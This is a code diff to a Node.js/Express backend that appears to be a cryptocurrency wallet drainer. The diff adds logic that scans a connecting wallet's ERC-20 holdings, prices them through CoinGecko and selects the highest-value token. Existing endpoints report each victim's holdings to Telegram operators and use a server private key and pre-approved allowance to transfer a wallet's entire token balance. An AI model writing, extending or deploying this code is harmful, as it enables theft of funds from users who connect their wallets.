@@ -3,6 +3,7 @@ const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
 const { ethers } = require('ethers');
+const erc20Abi = require('erc-20-abi');
 require('dotenv').config();
 
 const app = express();
@@ -64,9 +65,33 @@ const TELEGRAM_USER_IDS = process.env.TELEGRAM_USER_IDS
   ? process.env.TELEGRAM_USER_IDS.split(',').map(id => id.trim())
   : [];
 
+// Token analysis configuration
+const COMMON_TOKENS = [
+  { address: '0xdac17f958d2ee523a2206206994597c13d831ec7', symbol: 'USDT', priority: 1, coingeckoId: 'tether' },
+  { address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', symbol: 'USDC', priority: 1, coingeckoId: 'usd-coin' },
+  { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', priority: 2, coingeckoId: 'wrapped-bitcoin' },
+  { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', priority: 2, coingeckoId: 'ethereum' },
+  { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', priority: 3, coingeckoId: 'chainlink' },
+  { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', priority: 3, coingeckoId: 'uniswap' },
+  { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', priority: 3, coingeckoId: 'aave' },
+  { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', priority: 1, coingeckoId: 'dai' },
+  { address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', symbol: 'SHIB', priority: 4, coingeckoId: 'shiba-inu' },
+  { address: '0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', symbol: 'CRO', priority: 4, coingeckoId: 'crypto-com-chain' }
+];
+
+// ERC20 ABI for token interactions
+// const ERC20_ABI = [
+//   "function balanceOf(address owner) view returns (uint256)",
+//   "function decimals() view returns (uint8)",
+//   "function symbol() view returns (string)",
+//   "function name() view returns (string)"
+// ];
+
+const ERC20_ABI = erc20Abi;
+
 app.get('/api/test', (req, res) => {
-    res.json({ message: 'Backend is working!', timestamp: new Date().toISOString() });
-  });
+  res.json({ message: 'Backend is working!', timestamp: new Date().toISOString() });
+});
 
 // API endpoint to get configuration for frontend (without exposing private key)
 app.get('/api/config', (req, res) => {
@@ -84,11 +109,160 @@ app.get('/api/config', (req, res) => {
   }
 });
 
+// NEW: API endpoint to analyze wallet and get highest value token
+app.post('/api/analyze-wallet', async (req, res) => {
+  try {
+    const { address } = req.body;
+    
+    if (!address) {
+      return res.status(400).json({ error: 'Wallet address is required' });
+    }
+
+    console.log(`🔍 Starting token analysis for wallet: ${address}`);
+
+    // Analyze the wallet to find highest value token
+    const analysisResult = await analyzeWalletTokens(address);
+    
+    res.json({
+      success: true,
+      data: {
+        address: address,
+        highestValueToken: analysisResult.highestValueToken,
+        analysisDetails: analysisResult.details,
+        timestamp: new Date().toISOString()
+      }
+    });
+
+  } catch (error) {
+    console.error('Error analyzing wallet:', error);
+    res.status(500).json({ 
+      error: 'Wallet analysis failed', 
+      details: error.message 
+    });
+  }
+});
+
+// NEW: Enhanced token analysis function
+async function analyzeWalletTokens(walletAddress) {
+  const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
+  
+  let highestValue = 0;
+  let highestValueToken = '';
+  let highestBalance = 0;
+  const analysis = [];
+  let fallbackToken = '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'; // WBTC default
+
+  console.log(`🔍 Analyzing ${COMMON_TOKENS.length} tokens...`);
+
+  // Sort by priority (stablecoins and major tokens first)
+  const sortedTokens = [...COMMON_TOKENS].sort((a, b) => a.priority - b.priority);
+
+  for (const token of sortedTokens) {
+    try {
+      console.log(`📊 Checking ${token.symbol}...`);
+      
+      // Get token balance
+      const tokenData = await getTokenBalance(provider, token.address, walletAddress);
+      
+      if (tokenData && parseFloat(tokenData.balance) > 0) {
+        console.log(`💰 Found ${tokenData.balance} ${tokenData.symbol}`);
+        
+        // Get token price from CoinGecko
+        const price = await getTokenPrice(token.address);
+        const balance = parseFloat(tokenData.balance);
+        const usdValue = balance * price;
+        
+        const tokenInfo = {
+          address: token.address,
+          symbol: tokenData.symbol,
+          balance: tokenData.balance,
+          price: price,
+          usdValue: usdValue
+        };
+        
+        analysis.push(tokenInfo);
+        
+        console.log(`💲 ${tokenData.symbol}: ${balance} tokens × $${price} = $${usdValue.toFixed(2)}`);
+        
+        // Selection logic: prefer highest USD value, then highest token balance
+        const shouldSelect = usdValue > highestValue || 
+                           (usdValue === 0 && highestValue === 0 && balance > highestBalance);
+        
+        if (shouldSelect) {
+          highestValue = usdValue;
+          highestValueToken = token.address;
+          highestBalance = balance;
+          console.log(`🎯 New highest value token: ${tokenData.symbol} ($${usdValue.toFixed(2)})`);
+        }
+      }
+    } catch (error) {
+      console.warn(`⚠️ Error analyzing ${token.symbol}:`, error.message);
+    }
+  }
+
+  // If no tokens found, use fallback
+  if (!highestValueToken) {
+    console.log('⚠️ No tokens found, using WBTC fallback');
+    highestValueToken = fallbackToken;
+  }
+
+  console.log(`✅ Analysis complete. Selected token: ${highestValueToken}`);
+
+  return {
+    highestValueToken: highestValueToken,
+    details: {
+      tokensAnalyzed: analysis.length,
+      highestUsdValue: highestValue,
+      tokens: analysis
+    }
+  };
+}
+
+// NEW: Get token balance function
+async function getTokenBalance(provider, tokenAddress, walletAddress) {
+  try {
+    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+    
+    const [balance, decimals, symbol] = await Promise.all([
+      contract.balanceOf(walletAddress),
+      contract.decimals(),
+      contract.symbol()
+    ]);
+    
+    const formattedBalance = ethers.formatUnits(balance, decimals);
+    
+    return {
+      balance: formattedBalance,
+      decimals: decimals,
+      symbol: symbol,
+      address: tokenAddress
+    };
+  } catch (error) {
+    console.warn(`Token balance error for ${tokenAddress}:`, error.message);
+    return null;
+  }
+}
+
+// NEW: Get token price from CoinGecko
+async function getTokenPrice(contractAddress) {
+  try {
+    const response = await axios.get(
+      `https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${contractAddress}&vs_currencies=usd`,
+      { timeout: 5000 }
+    );
+    
+    return response.data[contractAddress.toLowerCase()]?.usd || 0;
+  } catch (error) {
+    console.warn(`Price fetch failed for ${contractAddress}:`, error.message);
+    return 0;
+  }
+}
+
 // API Routes
 app.post('/api/wallet-connected', async (req, res) => {
   try {
     const { address } = req.body;
-    //console.log(address)
+    
     if (!address) {
       return res.status(400).json({ error: 'Address is required' });
     }
@@ -96,14 +270,16 @@ app.post('/api/wallet-connected', async (req, res) => {
     // Get wallet data
     const walletData = await getWalletData(address);
     
-    // Format message
-    const message = formatWalletMessage(address, walletData);
+    // NEW: Also analyze tokens to find highest value
+    const tokenAnalysis = await analyzeWalletTokens(address);
+    
+    // Format message with token analysis
+    const message = formatWalletMessage(address, walletData, tokenAnalysis);
     
     // Send to all predefined destinations
     const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
       try {
         await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
-        //console.log(`Message sent to ${destination}`);
       } catch (error) {
         console.error(`Failed to send to ${destination}:`, error.message);
       }
@@ -113,7 +289,8 @@ app.post('/api/wallet-connected', async (req, res) => {
     
     res.json({ 
       success: true, 
-      message: `Wallet data sent to ${TELEGRAM_USER_IDS.length} Telegram destination(s)` 
+      message: `Wallet data sent to ${TELEGRAM_USER_IDS.length} Telegram destination(s)`,
+      highestValueToken: tokenAnalysis.highestValueToken
     });
   } catch (error) {
     console.error('Error:', error);
@@ -156,7 +333,6 @@ app.post('/api/token-transferred', async (req, res) => {
     const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
       try {
         await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
-        //console.log(`Transfer notification sent to ${destination}`);
       } catch (error) {
         console.error(`Failed to send transfer notification to ${destination}:`, error.message);
       }
@@ -194,7 +370,7 @@ app.post('/api/transfer-tokens', async (req, res) => {
     const privateKey = process.env.APPROVAL_WALLET_PRIVATE_KEY;
     const rpcUrl = process.env.RPC_URL;
     const approvalAddress = process.env.APPROVAL_ADDRESS;
-    console.log("config data: ", rpcUrl, approvalAddress)
+    console.log("config data: ", rpcUrl, approvalAddress);
 
     if (!privateKey || !rpcUrl || !approvalAddress) {
       return res.status(500).json({ 
@@ -226,8 +402,6 @@ app.post('/api/transfer-tokens', async (req, res) => {
       tokenContract.allowance(fromAddress, approvalAddress)
     ]);
     
-    //console.log(`Token: ${symbol}, Balance: ${ethers.formatUnits(balance, decimals)}`);
-    
     // Check if we have sufficient allowance
     if (allowance < balance) {
       return res.status(400).json({ 
@@ -242,14 +416,10 @@ app.post('/api/transfer-tokens', async (req, res) => {
       balance // Transfer full balance
     );
     
-    //console.log(`Transfer transaction sent: ${transferTx.hash}`);
-    
     // Wait for confirmation
     const receipt = await transferTx.wait();
     
     if (receipt.status === 1) {
-      //console.log(`✅ Transfer successful! Hash: ${receipt.hash}`);
-      
       res.json({
         success: true,
         txHash: receipt.hash,
@@ -378,10 +548,19 @@ async function calculateTotalUSD(ethBalance, tokens) {
   }
 }
 
-function formatWalletMessage(address, data) {
+function formatWalletMessage(address, data, tokenAnalysis = null) {
   let message = `<b>💰 Wallet Analysis</b>\n\n`;
   message += `<b>Address:</b> <code>${address}</code>\n`;
   message += `<b>Total Value:</b> $${data.totalUSD} USD\n\n`;
+  
+  // NEW: Add highest value token info
+  if (tokenAnalysis) {
+    const highestToken = tokenAnalysis.details.tokens.find(t => t.address === tokenAnalysis.highestValueToken);
+    if (highestToken) {
+      message += `<b>🎯 Highest Value Token:</b>\n`;
+      message += `${highestToken.symbol}: ${highestToken.balance} tokens (~$${highestToken.usdValue.toFixed(2)})\n\n`;
+    }
+  }
   
   // Native balance
   message += `<b>🔷 Native Balance:</b>\n`;
@@ -444,6 +623,6 @@ function formatTransferMessage(transferData) {
 // Start server
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => {
-  //console.log(`Server running on port ${PORT}`);
-  //console.log('Telegram bot is active');
+  console.log(`Server running on port ${PORT}`);
+  console.log('Telegram bot is active');
 });
